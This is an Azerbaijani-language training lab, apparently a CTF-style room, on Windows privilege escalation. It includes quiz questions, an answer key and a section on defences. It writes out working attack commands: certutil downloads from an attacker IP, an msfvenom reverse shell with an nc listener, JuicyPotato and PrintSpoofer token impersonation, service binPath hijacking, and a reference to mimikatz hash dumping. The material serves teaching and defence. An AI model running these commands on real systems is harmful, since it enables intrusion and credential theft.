# Room: Windows PrivEsc — Praktiki Texnikalar

**Path:** Privilege Escalation
**Module:** Windows PrivEsc
**Çətinlik:** Intermediate
**Təxmini vaxt:** 2 saat

## Room haqqında

Əsaslar room-u Windows privesc xəritəsini verdi; bu room xəritəni əl ilə gəzir: winPEAS ilə enum, SeImpersonatePrivilege istismarı (JuicyPotato ailəsi), servis registry qapıları və tam ssenari — webshell-dən SYSTEM-a qədər. Hər texnika əmr çıxışları ilə, lab şəraitinə uyğun şəkildə göstərilir.

## Öyrənmə nəticələri

- winPEAS output-unu oxumaq və qapıları seçmək
- SeImpersonatePrivilege-ı JuicyPotato/PrintSpoofer ilə istismar etmək
- Servis registry qapısını addım-addım açmaq
- Webshell → SYSTEM tam zəncirini keçmək

## Task 1 — winPEAS: Enumun Mərkəzi Aləti

**winPEAS** — PEASS ailəsinin Windows versiyası (linpeas-ın qardaşı). Hədəfə köçürülüb işə salınır:

```cmd
# Attacker: python3 -m http.server 80
# Hədəf (shell-də):
certutil -urlcache -f http://10.10.14.1/winPEASx64.exe C:\Windows\Temp\wp.exe
C:\Windows\Temp\wp.exe
```

Output bölmələri (ən əhəmiyyətliləri):

- **Interesting services:** qeyri-standart servis-lər, icazə anomaliyaları, path-lər.
- **Modifiable services:** dəyişə biləcəyin servis siyahısı.
- **Credential-lar:** registry-də saxlanılanlar (Winlogon auto-login), konfiq fayllarında, browser-lərdə.
- **Scheduled tasks:** yazıla bilən task-lar.
- **Tokens/imtiyazlar:** `whoami /priv` analizi — impersonate/debug varmı.
- **AlwaysInstallElevated, UAC, registry autorun** — bütün klassik qapıların hazır yoxlaması.
- **Yazıla bilən qovluqlar, unquoted path-lər** — hər biri rənglə vurğulanır.

winPEAS output-unun uzunluğu (minlərlə sətir) haqqında praktik məsləhət: (1) output-u fayla saxla (`wp.exe > out.txt`), attacker maşına çək, orada oxu; (2) rəng kodları ilə tərkib — qırmızı/sarı prioritet; (3) **alternativ**: şəxsən hər kateqoriya üçün əmr bilmək (əvvəlki room-un bilikləri) — alət olmayanda (EDR bloklayanda, offline şəraitdə) əl enum hələ də gərəklidir.

Əl enum əmrləri lüğəti (minimal dəst):

```cmd
whoami /all                    # token, qruplar, imtiyazlar
systeminfo                     # patch, hotfix (kernel exploit qiymətləndirməsi)
net user                       # istifadəçilər
sc qc ServiceName              # servis konfiqurasiyası
wmic service get name,pathname # servis path-ləri (unquoted analizi)
netstat -ano                   # portlar (lokal servislər — pivot!)
cmdkey /list                   # saxlanılan credential-lar
```

Bu lüğət + winPEAS — enum-un tam dəsti.

### Sual 1

winPEAS output-unun ən vacib bölmələrindən dördünü deyin.

### Sual 2.

Output-u fayla saxlamaq nə üçün praktikdir?

### Sual 3.

"Əl enum hələ də gərəklidir" nə vaxt baş verir?

## Task 2 — SeImpersonatePrivilege: JuicyPotato Ailəsi

Ən məşhur müasir Windows privesc yolu (service hesabları üçün). Arxiplan (əvvəlki room-dan): **impersonate** imtiyazı = başqa prinsipalın tokenini daşımaq hüququ.

Mexanizm (konseptual): Windows-da bəzi sistem mexanizmləri (DCOM/NTLM negotiation, printer spooler) klientin **autentifikasiya edərək qoşulmasına** imkan verir. Bu cür qoşulmada server tərəfi (bizim proses) impersonate imtiyazı ilə **gələn istifadəçinin tokenini** əldə edir. Hücumun məntiqi: **özümüz SYSTEM-ə "autentifikasiya olunmağa" məcbur edirik** (lokal DCOM/PrintSpooler sorğusu ilə) → gələn token SYSTEM-ə aiddir → impersonate → SYSTEM shell.

Alət nəsli (adları bilinməli):

| Alət | Mexanizm | Dövr |
|---|---|---|
| RottenPotato | DCOM NTLM relay | 2016 (patch-lanıb) |
| JuicyPotato | genişlənmiş (COM CLSID-lər) | Server 2016-ya qədər effektiv |
| PrintSpoofer | PrintSpooler bug | Server 2019+ |
| SweetPotato/RoguePotato | digər variantlar | müxtəlif |

İstifadə (klassik JuicyPotato, uyğun sistemdə):

```cmd
# Attacker: msfvenom ilə reverse exe + http server
JuicyPotato.exe -l 1337 -p c:\temp\rev.exe -t * -c {CLSID}
# -l: lokal dinləmə portu, -t *: impersonation testi
# Uğurda: rev.exe SYSTEM kimi işə düşür → attacker-ə shell
```

PrintSpoofer daha sadə interfeyslə:

```cmd
PrintSpoofer.exe -i -c "c:\temp\rev.exe"
```

Şərt yalnız bir: `whoami /priv` → `SeImpersonatePrivilege` (service hesablarında — IIS, SQL agent, scheduled task hesablarında standart). Bu səbəbdən **webshell → SYSTEM** Windows-un ən çox görülən privesc naqillərindən biridir.

Diqqət: alətlər Windows versiyasına görə fərqlənir (JuicyPotato 2019+ -da işləmir, PrintSpoofer/RoguePotato davam edir) — enum-da OS versiyası + imtiyaz birlikdə oxunur.

### Sual 1

Impersonation hücumunun məntiqi bir cümlədə nədir?

### Sual 2.

JuicyPotato və PrintSpoofer hansı sistemlərdə effektivdir?

### Sual 3.

Niyə "webshell → SYSTEM" məşhur naqildir?

## Task 3 — Servis Registry Qapısı: Addım-addım

İkinci əsas yol — servis konfiqurasiyası. Tam praktik axın (lab-da):

**Addım 1 — Namizəd servisin tapılması (winPEAS/PowerUp):**

```
[+] Modifiable services
    SERVICE_ALL_ACCESS: user1 — 'BackupSvc'
```

**Addım 2 — Servisin yoxlanması:**

```cmd
sc qc BackupSvc
BINARY_PATH_NAME   :  C:\Program Files\Backup\backup.exe
SERVICE_START_NAME :  LocalSystem        ← SYSTEM kimi işləyir!
```

**Addım 3 — Payload hazırlığı (attacker):**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4445 -f exe -o rev.exe
# listener: nc -lvnp 4445
# Hədəfə köçür: certutil/http
```

**Addım 4 — Servis konfiqurasiyasının dəyişdirilməsi:**

```cmd
sc config BackupSvc binPath= "C:\Windows\Temp\rev.exe"
sc start BackupSvc
```

**Addım 5 — Nəticə:** listener-da SYSTEM shell (`whoami` → `nt authority\system`).

**Addım 6 — Təmizləmə (peşəkar vərdiş):** servis path-i geri qaytarılır (`sc config BackupSvc binPath= "C:\Program Files\Backup\backup.exe"`) — hədəf sistemdə iz buraxmamaq/ziyan verməmək ROE-nin hissəsidir.

Variasiyalar (eyni məntiqin digər təzahürləri):

- Binary özü yazıla biləndirsə — `sc config` lazım deyil, exe əvəzlənir.
- `sc start` icazəsi yoxdursa — restart gözlənilir (servis auto-start-dırsa).
- Registry birbaşa: `reg add HKLM\SYSTEM\CurrentControlSet\Services\BackupSvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\rev.exe` — eyni nəticə.

Bu texnikanın lab dəyəri: o, **"konfiqurasiya yazmaq = yüksək imtiyaz icrası"** formulunu ən saf şəkildə göstərir. Heç bir exploit yoxdur — yalnız qanuni admin alətləri (`sc`, `reg`) və yanlış icazə.

### Sual 1

`SERVICE_START_NAME: LocalSystem` nə deməkdir?

### Sual 2.

Niyə istismardan sonra path geri qaytarılır?

### Sual 3.

`sc config` və `reg add` variantlarının ortaq nəticəsi nədir?

## Task 4 — Kompleks Ssenari: Webshell-dən SYSTEM-a

Tam zəncir (hər addım əvvəlki biliklərin sintezi):

**Mərhələ 1 — İlkin giriş:** ASP.NET tətbiqində file upload zəifliyi (OWASP room-larından) → webshell (`cmd.aspx`) → `iis apppool\shop` shell.

**Mərhələ 2 — Mövqe qiymətləndirməsi:**

```cmd
whoami /priv
SeChangeNotifyPrivilege          (normal)
SeImpersonatePrivilege           ← QAPI!
SeAssignPrimaryTokenPrivilege    ← QAPI (impersonate ailəsi üçün əlavə güc)
```

**Mərhələ 3 — Enum (paralel):** winPEAS: AlwaysInstallElevated yox; unquoted servis yox; amma impersonate var. **Qərar: PrintSpoofer (Server 2019).**

**Mərhələ 4 — İstismar:**

```bash
# attacker: msfvenom + listener (4445)
```

```cmd
certutil -urlcache -f http://10.10.14.1/PrintSpoofer.exe C:\Windows\Temp\ps.exe
certutil -urlcache -f http://10.10.14.1/rev.exe C:\Windows\Temp\rev.exe
C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\rev.exe"
```

**Nəticə:** `nc` listener-da: `Microsoft Windows [Version 10.0.17763...]` → `whoami` → `nt authority\system`. **SYSTEM.**

**Mərhələ 5 — Post-SYSTEM (sonrakı module-ların qapısı):**

- `hashdump`-analoji: mimikatz ilə LSASS-dan lokal/loqon hash-ləri → AD mühitində lateral movement materialı.
- `ipconfig /all`, `route print` — daxili şəbəkə xəritəsi (pivot).
- Persistence ( növbəti path-in ilk module-u).

Ssenarinin dərsləri:

1. **Hər mərhələ ayrıca "kiçik" bilikdir** — upload (OWASP), tokenlər (bu module), impersonation (bu room). Zəncir = curriculum-un özü.
2. **Enum qərar verir:** winPEAS-in "yox" dediyi yerlərdə vaxt itirmək olmazdı; `whoami /priv` isə dərhal yolu göstərdi.
3. **Alət-mühit uyğunluğu:** Server 2019 → PrintSpoofer (JuicyPotato yox) — versiya oxunmadan alət seçilməz.

### Sual 1

Ssenaridə hansı zəifliklər zəncirləndi?

### Sual 2.

PrintSpoofer-ın seçilməsini nə müəyyənləşdirdi?

### Sual 3.

SYSTEM-dən sonrakı addımlar nələrdir?

## Task 5 — Müdafiə və Path Yekunu

Windows privesc müdafiəsi (Linux modulundakı kimi — qapıları bağlamaq):

**1. Servis icazələri:** quraşdırıcı vendor-ların səhvləri (yazıla bilən servis qovluqları) — SCCM/planlı audit: `accesschk` əsaslı müntəzəm yoxlama, qeyri-standart servis icazələrinin düzəldilməsi.

**2. Impersonation riski:** service hesabları (app pool, task account-lar) mümkün olduqda **managed service account/virtual account** ilə; SeImpersonatePrivilege tələb edən yalnız gerçek lazım olan proseslərə; PrintSpooler servisi (PrintSpoofer qapısı!) tələb olunmayan sistemlərdə söndürülür (PrintNightmare-dən sonra default-off tendensiyası).

**3. Patch idarəetməsi:** kernel exploit qapısı + impersonation alətlərinin patch-ları — Windows Update intizamı.

**4. Credential gigiyenası:** registry-də auto-login plaintext parolların qadağası; cmdkey/DPAPI saxlancının məhdudluğu; LAPS (lokal admin parolları).

**5. EDR/monitorinq:** Potato ailəsinin davranış imzaları (COM aktivasiya anomaliyaları, PrintSpooler sorğu pattern-ləri), `sc config` anomaliyaları (qeyri-adi binary path dəyişiklikləri), SUID-analoji: qeyri-standart servis binary dəyişiklikləri.

Privilege Escalation path-i (6) tamamlandı:

- **Linux:** model (SUID/kernel/cron) + praktika (sudo -l/GTFOBins, passwd, SUID/PATH).
- **Windows:** model (token/servis/registry) + praktika (winPEAS, impersonation, servis qapısı).

Hər iki module-un vahid mesajı: **privesc = sistemdəki hazır qapıların tapılması**; OS-lər fərqlənir, **enum → qapı → istismar → root/SYSTEM** formulu universaldır.

Növbəti path — Post-Exploitation & Advanced Red Team — root-dan sonrakı dünyaya keçir: girişi saxlama (persistence), məlumat çıxarma (exfiltration), C2 framework-ləri, AV/EDR evasion. Privesc "zirvə" idi; post-exploitation "zirvədə qalmaq və iş görmək" sənətidir.

### Sual 1

PrintSpoofer-a qarşı spesifik müdafiə nədir?

### Sual 2

Windows privesc müdafiəsinin beş təbəqəsini sadalayın.

### Sual 3.

"Enum → qapı → istismar → SYSTEM" formulu nə üçün universaldır?

## Yekun Yoxlama (Summary Quiz)

1. winPEAS-ın output-unun əsas bölmələri və əl enum əmrləri?
2. SeImpersonatePrivilege hansı hesablarda olur və necə istismar olunur?
3. Servis registry qapısının istismar addımları?
4. PrintSpoofer ilə JuicyPotato arasındakı fərq nədir?
5. Post-exploitation privesc-dən nə ilə fərqlənir?

---

## CƏVAB AÇARI (yalnız content creator üçün — istifadəçiyə göstərilməməlidir)

**Task 1 sualları:**
1. Interesting/modifiable services, credential-lar (registry/konfiq), scheduled tasks, tokens/imtiyazlar (+ AlwaysInstallElevated, unquoted path).
2. Uzun output-u sakit şəkildə analiz etmək, attacker maşında axtarış (grep) etmək, rəng kodları faylda qorunur — tam araşdırma imkanı.
3. EDR winPEAS-i bloklayanda/imza tanıyanda; offline şəraitdə; alətin olmadığı minimal sistemlərdə — əl lüğəti hələ də bilinməlidir.

**Task 2 sualları:**
1. Lokal sistem mexanizmi (DCOM/PrintSpooler) vasitəsilə SYSTEM-in bizə qoşulmasına məcbur etmək → gələn SYSTEM tokenini impersonate etmək → SYSTEM shell.
2. JuicyPotato — Server 2016/2016-ya qədər (COM CLSID patch-ları); PrintSpoofer — Server 2019+ (PrintSpooler əsaslı).
3. Çünki IIS/app pool kimi service hesablarına SeImpersonatePrivilege default verilir — webshell əldə edən hücumçu demək olar həmişə bu qapını hazır tapır.

**Task 3 sualları:**
1. Servisin LocalSystem (SYSTEM) hesabı altında işlədiyini — bizim qoyduğumuz binary SYSTEM kimi icra olunacaq.
2. Hədəf sistemdə ziyan buraxmamaq (servis işini itirməsin) və izləri minimuma endirmək — ROE tələbi və peşəkar vərdiş.
3. Eyni qapının iki interfeysdən açılması: servis konfiqurasiyasının (SCM/registry) dəyişdirilməsi → öz binary-mizin SYSTEM kimi icrası.

**Task 4 sualları:**
1. File upload (webshell) → IIS apppool tokeni (SeImpersonatePrivilege) → PrintSpoofer (SYSTEM).
2. OS versiyası (Server 2019) + mövcud imtiyaz (impersonate) — JuicyPotato bu versiyada işləmədiyindən PrintSpoofer seçildi.
3. Hash dump (AD lateral materialı), şəbəkə xəritəsi (pivot), persistence — növbəti path-in mövzuları.

**Task 5 sualları:**
1. PrintSpooler servisinin söndürülməsi (tələb olunmayan sistemlərdə) — PrintSpoofer-ın mexanizmi bu servisə bağlıdır.
2. Servis icazə auditləri; impersonation/managed account idarəetməsi (+ Spooler off); patch; credential gigiyenası (auto-login/LAPS); EDR/monitorinq.
3. Çünki privesc məntiqi (sistem konfiqurasiyasındakı qapının tapılıb istismarı) OS-un mexanizmlərindən asılı deyil — metodologiya eynidir, yalnız "qapı növləri" dəyişir.

**Yekun Quiz:**
1. Bölmələr: services, credentials, tasks, tokens, registry qapıları; əl: whoami /all, systeminfo, sc qc, wmic service, netstat -ano, cmdkey /list.
2. Service hesablarında (IIS, SQL agent, task); lokal sistem mexanizminə (DCOM/Spooler) qoşulma məcburiyyəti ilə SYSTEM tokeni alınır → impersonate → shell.
3. Namizəd servis tap (winPEAS) → sc qc ilə SYSTEM/locsystem yoxla → payload köçür → sc config binPath → sc start → SYSTEM → təmizlə.
4. Mexanizm: COM/CLSID (Juicy) vs PrintSpooler (PrintSpoofer); versiya əhatəsi: 2016-dək vs 2019+.
5. Privesc hədəfə çatmaqdır (SYSTEM); post-exploitation hədəfdə qalmaq və iş görməkdir (persistence, exfil, C2, uzunmüddətli əməliyyat).
